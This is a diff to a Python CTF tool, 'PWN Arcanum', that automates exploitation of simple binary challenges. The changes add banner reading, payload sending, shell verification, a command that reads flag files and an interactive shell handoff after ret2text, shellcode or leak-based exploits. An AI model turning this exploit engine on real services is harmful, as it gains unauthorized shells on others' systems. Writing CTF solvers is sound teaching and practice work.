@@ -1,5 +1,5 @@
 ﻿#!/usr/bin/env python3
-"""PWN Arcanum v1.0 - Automated PWN Analysis & Exploitation Engine
+"""PWN Arcanum v1.2 - Automated PWN Analysis & Exploitation Engine
 
 Cross-platform (Windows / macOS / Linux) automated solver for simple PWN challenges:
   - ret2text (call win/backdoor function)
@@ -57,7 +57,7 @@ BANNER = r"""
    ___|  |     |     |   _  |     \    _  _|  _  _|  _  _|  _  |
   |      |  -  |  -  |  . | |  -- <   | | | | |_ |_| |_ | | . | |
   |______|___|_|___|_|_|\__|_|_|_\_|  |___| |___|___|___|\___|
-                                                          v1.0
+                                                          v1.2
 """
 
 # ---------------------------------------------------------------------------
@@ -1139,24 +1139,95 @@ class PWNArcanum:
             print(C.err(f"Connection failed: {e}"))
             return
 
-        # Send payload
+        # Step 1: Receive banner / prompt from the target
+        try:
+            banner = io.recv(timeout=3)
+            if banner:
+                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
+        except Exception:
+            pass  # No banner or connection immediately ready for input
+
+        # Step 2: Send payload (sendline adds \n which gets() needs to return)
         print(C.info(f"Sending payload ({len(self.payload)} bytes) ..."))
         try:
-            io.send(self.payload)
-            # Try sending newline
-            io.send(b'\n')
+            io.sendline(self.payload)
         except Exception as e:
             print(C.err(f"Send failed: {e}"))
+            io.close()
             return
 
+        # Step 3: Determine if this is a "cat flag" style exploit or a shell exploit
+        is_cat_flag = (
+            hasattr(self.analyzer, 'cat_flag_gadgets') and
+            self.analyzer.cat_flag_gadgets and
+            self.strategy in ('ret2text', 'auto')
+        )
+
+        if is_cat_flag:
+            # cat-flag gadget: flag is printed to stdout, no shell
+            print(C.info("cat-flag gadget detected, waiting for output ..."))
+            time.sleep(0.5)
+            try:
+                data = io.recvall(timeout=5)
+                if data:
+                    decoded = data.decode('utf-8', errors='replace')
+                    print(C.hit(f"Output:\n{decoded}"))
+                    flags = self._extract_flags(data)
+                    if flags:
+                        for f in flags:
+                            print(C.flag(f))
+                    else:
+                        print(C.warn("No flag pattern found in output"))
+                else:
+                    print(C.warn("No output received after payload"))
+            except Exception as e:
+                print(C.err(f"Receive error: {e}"))
+            io.close()
+            return
+
+        # Shell-based exploit (ret2shellcode / ret2syscall / ret2text with real shell)
         if interactive:
+            # Wait briefly for shell to spawn
+            time.sleep(0.3)
+            try:
+                initial = io.recv(timeout=1)
+                if initial:
+                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
+            except Exception:
+                pass
+
+            # Send a test command to verify shell is alive
+            try:
+                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
+                time.sleep(0.5)
+                check = io.recv(timeout=2)
+                if b'PWN_ARCANUM_SHELL_OK' in check:
+                    print(C.hit("Shell confirmed alive!"))
+                    # Try to cat flag first
+                    io.sendline(b'cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/*/flag* 2>/dev/null')
+                    time.sleep(0.5)
+                    try:
+                        flag_data = io.recv(timeout=2)
+                        if flag_data:
+                            print(C.hit(f"Flag output: {flag_data.decode('utf-8', errors='replace').strip()}"))
+                            flags = self._extract_flags(flag_data)
+                            for f in flags:
+                                print(C.flag(f))
+                    except Exception:
+                        pass
+                else:
+                    print(C.warn(f"Unexpected response: {check}"))
+            except Exception:
+                print(C.warn("No shell response, trying interactive anyway..."))
+
             print(C.hit("Switching to interactive mode (Ctrl+C to exit)"))
             try:
                 io.interactive()
             except KeyboardInterrupt:
                 print("\n" + C.info("Exiting interactive mode"))
         else:
-            # Try to read flag
+            # Non-interactive: collect all output
+            time.sleep(0.5)
             try:
                 data = io.recvall(timeout=5)
                 if data:
@@ -1164,7 +1235,7 @@ class PWNArcanum:
                     flags = self._extract_flags(data)
                     for f in flags:
                         print(C.flag(f))
-            except:
+            except Exception:
                 pass
 
         io.close()
@@ -1186,9 +1257,16 @@ class PWNArcanum:
             print(C.err(f"Connection failed: {e}"))
             return
 
+        # Receive banner if any
+        try:
+            banner = io.recv(timeout=3)
+            if banner:
+                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
+        except Exception:
+            pass
+
         print(C.info(f"Sending stage 1 ({len(stage1)} bytes)"))
-        io.send(stage1)
-        io.send(b'\n')
+        io.sendline(stage1)
 
         # Receive leaked address
         try:
@@ -1255,16 +1333,49 @@ class PWNArcanum:
         except:
             pass
 
-        io.send(stage2)
-        io.send(b'\n')
+        io.sendline(stage2)
 
         if interactive:
+            # Wait for shell to spawn
+            time.sleep(0.3)
+            try:
+                initial = io.recv(timeout=1)
+                if initial:
+                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
+            except Exception:
+                pass
+
+            # Send a test command to verify shell is alive
+            try:
+                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
+                time.sleep(0.5)
+                check = io.recv(timeout=2)
+                if b'PWN_ARCANUM_SHELL_OK' in check:
+                    print(C.hit("Shell confirmed alive!"))
+                    # Try to cat flag first
+                    io.sendline(b'cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/*/flag* 2>/dev/null')
+                    time.sleep(0.5)
+                    try:
+                        flag_data = io.recv(timeout=2)
+                        if flag_data:
+                            print(C.hit(f"Flag output: {flag_data.decode('utf-8', errors='replace').strip()}"))
+                            flags = self._extract_flags(flag_data)
+                            for f in flags:
+                                print(C.flag(f))
+                    except Exception:
+                        pass
+                else:
+                    print(C.warn(f"Unexpected response: {check}"))
+            except Exception:
+                print(C.warn("No shell response, trying interactive anyway..."))
+
             print(C.hit("Got shell! Switching to interactive mode"))
             try:
                 io.interactive()
             except KeyboardInterrupt:
                 print("\n" + C.info("Exiting"))
         else:
+            time.sleep(0.5)
             try:
                 data = io.recvall(timeout=5)
                 if data:
@@ -1272,7 +1383,7 @@ class PWNArcanum:
                     flags = self._extract_flags(data)
                     for f in flags:
                         print(C.flag(f))
-            except:
+            except Exception:
                 pass
 
         io.close()
@@ -1318,7 +1429,7 @@ class PWNArcanum:
 # ===================================================================
 def main():
     parser = argparse.ArgumentParser(
-        description='PWN Arcanum v1.0 - Automated PWN Analysis & Exploitation',
+        description='PWN Arcanum v1.2 - Automated PWN Analysis & Exploitation',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
